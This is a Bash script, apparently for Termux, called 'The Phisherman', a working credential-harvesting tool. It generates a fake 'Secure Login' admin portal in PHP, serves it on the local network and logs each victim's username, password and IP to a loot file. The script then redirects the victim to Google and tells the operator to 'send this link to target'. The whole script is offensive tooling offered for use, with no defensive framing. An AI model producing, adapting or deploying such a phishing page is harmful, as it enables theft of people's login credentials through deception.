#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║ MODULE: THE PHISHERMAN v1.0                                              ║
# ║ TARGET: CREDENTIAL HARVESTING (LOCAL)                                    ║
# ║ AUTHOR: △ ᛋᛅᚱᛒᛅᚾᛏᛒᛁᛏᛅ ▽                                                ║
# ╚══════════════════════════════════════════════════════════════════════════╝

# --- [ COLORS ] ---
R='\033[1;31m'
DR='\033[0;31m'
G='\033[1;30m'
W='\033[1;37m'
Y='\033[1;33m'
P='\033[1;35m'
C='\033[0;36m'
N='\033[0m'

# --- [ DEPENDENCIES ] ---
if ! command -v php &> /dev/null; then
    echo -e "${R}[ERROR]${N} PHP is required for the web server."
    echo -e "${G}Installing PHP...${N}"
    pkg install php -y
fi

# --- [ WORKSPACE SETUP ] ---
WORK_DIR="$HOME/.rdos_phish"
LOG_FILE="$WORK_DIR/loot.txt"
mkdir -p "$WORK_DIR"
touch "$LOG_FILE"

# --- [ TEMPLATE GENERATION ] ---
create_login_page() {
    cat << 'EOF' > "$WORK_DIR/index.php"
<?php
$file = 'loot.txt';
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');
    
    $entry = "[$time] IP: $ip | USER: $user | PASS: $pass" . PHP_EOL;
    file_put_contents($file, $entry, FILE_APPEND);
    
    // Redirect to distract
    header('Location: https://google.com');
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Admin Portal</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
h2 { color: #333; margin-bottom: 20px; }
input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
button:hover { background: #0056b3; }
.logo { font-weight: bold; font-size: 24px; color: #007bff; margin-bottom: 10px; }
</style>
</head>
<body>
<div class="login-box">
    <div class="logo">Secure Login</div>
    <h2>Authenticate</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Username / Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
    </form>
    <p style="font-size: 12px; color: #777; margin-top: 20px;">Protected Area. Authorized Personnel Only.</p>
</div>
</body>
</html>
EOF
}

# --- [ MAIN ] ---
clear
echo -e "${R}"
echo "   █▀▀ █ █ █▀▀ █ █ █▀▀ █▀▄ █▄ █ █▀█ █▄ █"
echo "   █▀▀ █▀█ █▀▀ █▀█ █▀▀ █▀▄ █ ▀█ █▀█ █ ▀█"
echo "   ▀   ▀ ▀ ▀▀▀ ▀ ▀ ▀▀▀ ▀ ▀ ▀  ▀ ▀ ▀ ▀  ▀"
echo -e "   ${P}:: CREDENTIAL HARVESTER v1.0 ::${N}"
echo ""

echo -e "${W}SETTING UP TRAP...${N}"
create_login_page
echo -e "${Y}TEMPLATE GENERATED: Generic Admin Portal${N}"

# Get Local IP
LOCAL_IP=$(ifconfig | grep -oP 'inet \K[\d.]+' | grep -v '127.0.0.1' | head -n1)
PORT="8080"

echo -e "${G}STARTING SERVER ON: ${C}http://$LOCAL_IP:$PORT${N}"
echo -e "${R}>>> SEND THIS LINK TO TARGET <<<${N}"
echo ""
line
echo -e "${W}WAITING FOR VICTIMS... (CTRL+C to stop)${N}"
line

# Start PHP Server in Background
php -S 0.0.0.0:$PORT -t "$WORK_DIR" > /dev/null 2>&1 &
PHP_PID=$!

# Monitor Log File
tail -f "$LOG_FILE" | while read line; do
    if [[ "$line" == *"PASS:"* ]]; then
        echo -e "${R}[LOOT]${N} ${Y}$line${N}"
        # Optional: Play a sound or vibrate
        termux-vibrate -d 500 -f
    fi
done

# Cleanup on Exit
trap "kill $PHP_PID; echo -e '\n${G}SERVER STOPPED.${N}'; exit" SIGINT

